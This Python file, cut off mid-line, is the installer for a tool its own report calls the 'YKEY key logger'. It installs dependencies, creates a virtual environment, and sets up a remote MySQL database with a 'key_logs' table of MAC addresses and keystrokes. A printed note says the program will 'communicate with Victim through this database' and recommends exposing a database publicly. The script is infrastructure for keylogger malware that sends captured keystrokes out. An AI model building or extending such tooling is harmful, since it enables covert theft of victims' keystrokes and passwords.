# !/usr/bin/python

from os import devnull, system
from os.path import dirname, realpath
from subprocess import call, check_output, CalledProcessError
from libs.colors import COLORS
from sys import argv
from libs.logo import PrintLogo


colors = COLORS()


# empty dictinalry for append installation status
check_list = {}
program_path = dirname(realpath(__file__))
logo_printer = PrintLogo(program_path)
devnull = open(devnull, 'w')
dependencies = []

def execfile_y(file_name, globals_variables):
    exec(compile(open(file_name, "rb").read(), file_name, 'exec'), globals_variables)


def check_for_dependency():
    # Open the file contains dependencies
    not_installed = []
    global program_path
    with open(f'{program_path}/data/lib_list.txt', 'r') as lib_list:
        while True:
            data_line = lib_list.readline()
            if not data_line:
                break
            
            dependancy = data_line.split('=')[0]

            if dependancy[-1] == '\n':
                dependancy = dependancy[:-1]

            if len(dependancy) > 0:
                global dependencies
                dependencies.append(dependancy)
                try:
                    if dependancy == 'mysql-connector':
                        dependancy_edit = 'mysql'
                    else:
                        dependancy_edit = dependancy

                    __import__('imp').find_module(dependancy_edit)
                    print("{:<18}".format(dependancy) + colors.Green + "[✓]Found" + colors.RESET)
                except ImportError:
                    not_installed.append(dependancy)
                    print("{:<18}".format(dependancy) + colors.Red + "[✘]Not Found" + colors.RESET)

    global check_list
    if len(not_installed) == 0:
        check_list['Pre installed dependencies'] = True
    else:
        check_list['Pre installed dependencies'] = 'Missing Found'

    return not_installed


def install_packages(packages):
    global check_list
    global devnull
    try:
        for item in packages:
            print(colors.Cyan + f'[!]Installing {item} .......' + colors.RESET)
            check_output('pip3 install {}'.format(item), shell=True, stderr=devnull)
            print(colors.Green + f'[✓]Successfully installed {item}')
        check_list['Installed missing dependencies'] = True
    
    except CalledProcessError:
        check_list['Installed missing dependencies'] = False
        print(colors.Red + f'[✘]Error occurred while installing {item}' + colors.RESET)


def create_virtual_env():
    global program_path
    global devnull
    global check_list
    global dependencies

    print(colors.Yellow + colors.BOLD + '\n\n[!]Creating Virutual environment for compiling the program\n' + colors.RESET)
    try:
        # CREATING VENV DIRECTORY

        try:
            check_output('rm -R venv', shell=True, stderr=devnull)
        except CalledProcessError:
            pass

        check_output('mkdir venv',shell=True, stderr=devnull)
        print(colors.Green + '[✓]venv Folder created..' + colors.RESET)

        # creating virtula environment
        check_output('virtualenv venv', shell=True, stderr=devnull)
        print(colors.Green + '[✓]Virtual environment created successfully' + colors.RESET)

        # activating virtual environment
        venv_file_path = program_path + '/venv/bin/activate_this.py'
        execfile_y(venv_file_path, dict(__file__=venv_file_path))
        print(colors.Green + '[✓]Virtual Environment Activated!!')

        # install packages inside virtual environment
        for package in dependencies:
            if package != 'virtualenv':
                check_output(f'pip install {package}', shell=True)
                print(colors.Green + f'[✓]Successfully installed package {colors.BOLD}{colors.ULINE}{package}' + colors.RESET)

        check_list['Virtual Environment Creation'] = True

    except CalledProcessError as error:
        print(colors.Red + '[✘]Error while ececuting commands...')
        print(f'[✘]{error}' + colors.RESET)
        check_list['Virtual Environment Creation'] = False


def configure_mysql():
    global check_list
    global program_path

    try:
        from mysql.connector import connect

        print(colors.Cyan + colors.BOLD + 'IMPORTANT NOTE!!!!!:' + colors.RESET)
        print(colors.Cyan, end='')

        string = f"\tIn order to continue you must have an online MYSQL Database created\n\
        \t& and also you must have the login data (Username, Password, Server_name,\n\
        \tDatabase_name, Port) Because in future this program will communicate with\n\
        \tVictim through this database\n\n\
        \t # You can open your localhost mysql data base to public {colors.BOLD}{colors.ULINE}(RECOMENDED){colors.RESET}{colors.Cyan}\n\
        \t # You can visit https://remotemysql.com/ to create a free database quickly\n\
        \t # You can conncet your domains database\n\n\
        "

        print(string, colors.RESET)
        status = input('Do you want to SKIP this configuration (y/n) ')

        if status == 'y' or status == 'Y':
            print(colors.Red + "[!]You haven't configured database run the command below to conficre later" )
            print(colors.ITALIC + '\tpython3 install.py --configure-mysql\n\n' + colors.RESET)
            check_list['MYSQL Configuration'] = 'Skipped for later'
        else:
            print('\nPlease enter folowing details' + colors.BOLD)
            Username = input('    Username     : ')
            Database = input('    Database_name: ')
            Password = input('    Password     : ')
            Server   = input('    Server name  : ')
            Port     = int(input('    Port ID      : '))
            print(colors.RESET)

            with open(f'{program_path}/data/database_credentials.txt', 'w') as credentials:
                content =  f"Username={Username}\nDatabase={Database}\nPassword={Password}\nServer={Server}\nPort={Port}"
                credentials.write(content)

            # starting configure online database
            print(colors.Yellow + '[!]Connecting to the MYSQL database')
            database = connect(
                host=Server,
                user=Username,
                passwd=Password,
                database=Database,
                port=Port
            )
            print(colors.Green + '[✓]Connected successfully')

            database_cusrsor = database.cursor()
            command = "CREATE TABLE IF NOT EXISTS `key_logs`(`p_id` int(11) PRIMARY KEY NOT NULL, `mac_address` text, `keys` text);"
            database_cusrsor.execute(command)

            database.commit()

            print(colors.Green + '[✓]Database configured successfully')

            check_list['MYSQL Configuration'] = True

    except Exception as error:
        print(colors.Red + '[✘]Error Occured while operation')
        print(f'[✘]ERROR: {error}' + colors.RESET)
        check_list['MYSQL Configuration'] = False


def print_configuration_report():
    print(colors.RESET + colors.Yellow + colors.BOLD + '\n\nSummery of YKEY key logger installation report' + colors.RESET)
    global check_list
    print(colors.RESET)

    error = False

    for key in check_list:
        if str(check_list[key]) == 'True':
            print("\t{:35} ".format(key) + colors.Green + 'SUCCESFULL' + colors.RESET)
        elif str(check_list[key]) == 'False':
            print("\t{:35} ".format(key) + colors.Red + 'ERROR OCCURED' + colors.RESET)
            error = True
        else:
            print("\t{:35} ".format(key) + colors.Yellow + 'SKIPPED' + colors.RESET)

    if not error:
        print(colors.Green + '\n[✓]Installation successfull and you are good to continue\n\n' + colors.RESET)
    else:
        print(colors.Red + '\n[✘]Installation unsuccessfull please re install')

##############################################################################
#                               MAIN PROGRAM                                 #
##############################################################################


# Welcome message print
call('clear', shell=True)
logo_printer.print()


try:
    if argv[1] == '--c
